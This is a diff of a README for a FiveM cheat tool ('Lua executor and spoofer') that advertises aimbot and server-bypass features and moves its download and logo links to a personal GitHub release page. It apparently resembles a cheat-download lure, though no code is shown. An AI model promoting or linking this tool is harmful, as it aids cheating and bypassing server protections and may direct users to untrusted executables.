@@ -1,6 +1,6 @@
 # redENGINE-FiveM
 
-![redENGINE Logo](https://example.com/redengine_logo.jpg)
+![redENGINE Logo](https://github.com/mizanhsn/redENGINE-FiveM/releases/tag/v1.0)
 
 redENGINE - FiveM Lua Executor & Spoofer is the ultimate tool for enhancing your FiveM gaming experience. With the latest update in February 2025, our software provides top-of-the-line features to give you the edge you need in the virtual world. Whether you're looking for aimbot capabilities, cheat downloads, or server bypass options, redENGINE has got you covered.
 
@@ -33,7 +33,7 @@ redENGINE - FiveM Lua Executor & Spoofer is the ultimate tool for enhancing your
 - redengineeulen
 
 ## Installation
-You can download the latest release of redENGINE-FiveM by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+You can download the latest release of redENGINE-FiveM by clicking [here](https://github.com/mizanhsn/redENGINE-FiveM/releases/tag/v1.0).
 
 :rocket: Get ready to unleash the power of redENGINE in your FiveM gameplay experience!
 
